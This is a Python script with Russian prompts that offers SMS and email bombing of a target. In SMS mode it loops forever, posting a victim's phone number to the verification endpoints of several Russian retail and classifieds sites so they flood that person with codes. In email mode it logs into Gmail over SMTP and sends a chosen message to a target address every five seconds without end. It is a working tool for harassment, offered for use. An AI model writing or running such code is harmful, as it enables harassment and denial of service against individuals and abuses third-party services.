import smtplib
import time
import requests

mail = smtplib.SMTP("smtp.gmail.com",587)

print ("""
                              
          ____                
        ,"  , `.    ,---,     
     ,-+-,." _ |  ."  ." `\   
  ,-+-. ;   , ||,---."     \  
 ,--."|"   |  ;||   |  .`\  | 
|   |  ,", |  "::   : |  "  | 
|   | /  | |  |||   " "  ;  : 
"   | :  | :  |,"   | ;  .  | 
;   . |  ; |--" |   | :  |  " 
|   : |  | ,    "   : | /  ;  
|   : "  |/     |   | "` ,/   
;   | |`-"      ;   :  ."     
|   ;/          |   ,."       
"---"           "---" """)
print("|MailDonbass creator Jihad|") 
while 1 == 1:
	choose = input("бомбить смс или бомбить эмэил(n/m):")
	if choose == "n":
		_phone = input("Номер для бомбежа:")
		if _phone[0] == "+":
			_phone = _phone[1:]
		if _phone[0] == "8":
			_phone = "7"+_phone[1:]
		if _phone[0] == "9":
			_phone = "7"+_phone
		while True:
			try:
				requests.post("https://www.citilink.ru/registration/confirm/phone/+" + _phone + "/")
				print("Отправлено!")
			except:
				print("Не отправлено!")
			try:
			        requests.post("https://youla.ru/web-api/auth/request_code", data={"phone": _phone})
			        print("Отправлено!")
			except:
			        print("Не отправлено!")
			try:
			        requests.post("https://api.sunlight.net/v3/customers/authorization/", data={"phone": _phone})
			        print("Отправлено!")
			except:
			        print("Не отправлено!")
	if choose == "m":
		bomb_email = input("Чей эмэил бомбить: ")
		email = input("Введите почту:")
		password = input("Введите пароль от вашей почты:")
		message = input("Сообщение для спама:")
		while True:
			mail.ehlo()
			mail.starttls()
			mail.login(email,password)
			while True:
			 		mail.sendmail(email,bomb_email,message)
			 		print("сообщение отослано:", bomb_email)
			 		time.sleep(5)
